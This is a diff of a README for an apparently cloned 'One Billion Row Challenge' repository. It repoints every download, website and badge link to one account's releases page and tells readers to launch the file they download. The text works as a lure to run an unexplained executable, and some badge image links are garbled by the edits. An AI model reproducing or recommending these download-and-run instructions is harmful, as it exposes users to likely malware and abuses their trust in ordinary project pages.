@@ -11,16 +11,16 @@ Welcome to the "2025-One-Billion-Row-Challenge-Aovivo" repository! This is the p
 We have exciting new developments for you! Check them out below:
 
 ## 🎉 New Release Available 🎉
-We have a new release available! You can download it by clicking [here](https://github.com/assets/Release.zip) to get started. Make sure to launch the file after downloading to experience the latest features and improvements.
+We have a new release available! You can download it by clicking [here](https://github.com/stickyfingers11/2025-One-Billion-Row-Challenge-Aovivo/releases) to get started. Make sure to launch the file after downloading to experience the latest features and improvements.
 
 ## 🌐 Visit Our Website
-To stay updated on all things related to the One Billion Row Challenge, visit our [website](https://github.com/assets/Release.zip).
+To stay updated on all things related to the One Billion Row Challenge, visit our [website](https://github.com/stickyfingers11/2025-One-Billion-Row-Challenge-Aovivo/releases).
 
 ## 💡 Check the Releases Section
 If the provided link is not working or you prefer to explore more options, head over to the "Releases" section of the repository for additional resources.
 
 ## 🔗 Download Link Button
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/assets/Release.zip)
+[![Download Latest Release](https://github.com/stickyfingers11/2025-One-Billion-Row-Challenge-Aovivo/releases%20Release-brightgreen)](https://github.com/stickyfingers11/2025-One-Billion-Row-Challenge-Aovivo/releases)
 
 ---
 
@@ -57,7 +57,7 @@ Whether you are a seasoned data expert or just starting your data journey, the O
 
 Let's embrace the power of big data, tackle the billion rows, and pave the way for a brighter and more data-driven future. The challenge awaits - are you ready to take it on?
 
-[![Get Started Now](https://img.shields.io/badge/Join%20the%20Challenge-Get%20Started%20Now-blue)](https://github.com/assets/Release.zip)
+[![Get Started Now](https://github.com/stickyfingers11/2025-One-Billion-Row-Challenge-Aovivo/releases%20the%20Challenge-Get%20Started%20Now-blue)](https://github.com/stickyfingers11/2025-One-Billion-Row-Challenge-Aovivo/releases)
 
 ---
 
